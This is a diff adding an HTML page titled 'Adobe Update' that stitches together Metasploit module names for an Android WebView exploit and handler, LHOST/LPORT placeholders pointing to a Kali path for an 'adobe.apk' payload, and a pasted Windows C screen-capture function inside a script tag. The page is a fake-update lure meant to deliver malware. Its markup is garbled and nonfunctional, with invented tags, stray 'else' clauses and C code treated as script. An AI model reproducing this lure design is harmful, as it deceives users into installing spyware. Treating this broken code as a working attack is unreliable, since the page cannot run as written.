@@ -1,0 +1,49 @@
+<link><img src = "Void">
+<open = Void = (run/exploit/msf6+++) </open>
+<open = html = (run/exploit/msf6+++) </open>
+<open = (URIPATH = /home/kali/Desktop/adobe.apk) </open>
+<html>
+  <head>
+    <title> Adobe Update </title>
+  </head>
+  <body>
+  <div cetmgr /c/root/user/android/run/exploit/msf6+++ [/.apk[/r URIPATH = /home/kali/Desktop/adobe.apk][/r/home/kali/Desktop/adobe.apk][run][exploit][msf6+++]>
+  <div src = 'exploit/multi/handler'
+          src = 'exploit/android/browser/webview_addjavascriptinterface'
+          src = "(LHOST = [SEU IP])"
+          src = "(LPORT = [SUA PORTA])"
+          src = "(SRVHOST = [IP ALVO])"
+          src = "(SRVPORT = [PORTA ALVO])"
+          src = "(URIPATH = /home/kali/Desktop/adobe.apk)"
+          src = '(run)'
+          src = '(exploit)'
+          else
+          src = '(msf6+++)'
+          end else (3) 
+          </div>
+          <div
+          action = (run)
+          action = (exploit)
+          else
+          action = (msf6+++)
+          end else(1)>
+<script src =
+Void CaptureScreen()
+    int nScreenWidth = GetSystemMetrics(SM_CXSCREEN);
+    int nScreenHeight = GetSystemMetrics(SM_CYSCREEN);
+    HWND hDesktopWnd = GetDesktopWindow();
+    HDC hDesktopDC = GetDC(hDesktopWnd);
+    HDC hCaptureDC = CreateCompatibleDC(hDesktopDC);
+    HBITMAP hCaptureBitmap =CreateCompatibleBitmap(hDesktopDC, 
+                            nScreenWidth, nScreenHeight);
+    SelectObject(hCaptureDC,hCaptureBitmap); 
+    BitBlt(hCaptureDC,0,0,nScreenWidth,nScreenHeight,
+           hDesktopDC,0,0,SRCCOPY|CAPTUREBLT); 
+    SaveCapturedBitmap(hCaptureBitmap); 
+    ReleaseDC(hDesktopWnd,hDesktopDC);
+    DeleteDC(hCaptureDC);
+    DeleteObject(hCaptureBitmap);>
+</script>
+<div open = ("msf6+++")/("exploit"/("run")/) = executar>
+  </body>
+</html>
